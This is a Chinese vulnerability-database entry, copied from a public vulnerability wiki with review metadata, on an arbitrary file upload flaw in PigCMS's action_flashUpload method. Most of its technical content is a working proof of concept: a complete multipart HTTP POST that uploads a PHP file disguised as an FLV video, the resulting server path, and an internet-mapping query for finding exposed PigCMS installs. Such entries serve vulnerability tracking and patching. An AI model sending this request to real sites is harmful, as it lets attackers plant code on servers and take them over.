---
source: "Threekiii/Vulnerability-Wiki"
product: "PigCMS action_flashUpload"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "PigCMS-action_flashUpload-任意文件上传漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：同358，实际权限待核验"
side_effects: "未执行；本文需注意的操作影响：与358正文相同，无独立技术增量；主目录应PigCMS而非PigCMS-action_flashUpload"
source_status: "unknown"
id: "vw-8cfb588c0d1b199c127cb563"
entity_id: "ve-b4aecb0677af7db051be6dde"
schema_version: "1"
canonical: "Web安全/CMS内容/PigCMS/PigCMS action_flashUpload 任意文件上传漏洞.md"
relation_type: "duplicate_of"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：同358，实际权限待核验

- **结论使用边界（1）**：与358正文相同，无独立技术增量；主目录应PigCMS而非PigCMS-action_flashUpload。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（2）**：同样结尾boundary不完整及版本缺失，保留图片差异待核。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# PigCMS action_flashUpload 任意文件上传漏洞

## 漏洞描述

PigCMS action_flashUpload 方法中存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件获取到服务器权限

## 漏洞影响

pigcms

## 网络测绘

```
app.name="PigCMS"
```

## 漏洞复现

登陆页面

![image-20230828161452591](./.resource/PigCMS-action_flashUpload-任意文件上传漏洞/media/image-20230828161452591.png)

验证POC

```
POST /cms/manage/admin.php?m=manage&c=background&a=action_flashUpload HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----aaa

------aaa
Content-Disposition: form-data; name="filePath"; filename="test.php"
Content-Type: video/x-flv

<?php phpinfo();?>
------aaa
```

![image-20230828161506565](./.resource/PigCMS-action_flashUpload-任意文件上传漏洞/media/image-20230828161506565.png)

```
/cms/upload/images/2023/08/11/1691722887xXbx.php
```

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
